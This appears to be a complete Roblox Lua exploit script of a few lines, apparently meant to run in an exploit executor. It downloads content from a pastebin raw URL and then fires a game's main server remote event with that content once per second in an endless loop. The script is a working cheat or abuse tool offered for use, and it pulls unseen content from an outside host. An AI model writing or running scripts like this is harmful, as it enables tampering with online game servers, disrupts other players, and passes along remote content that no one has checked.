local work = game:HttpGet("https://pastebin.com/raw/AJXZYi7K")

while task.wait(1) do
workspace.__THINGS.__REMOTES.MAIN:FireServer("b", work)
end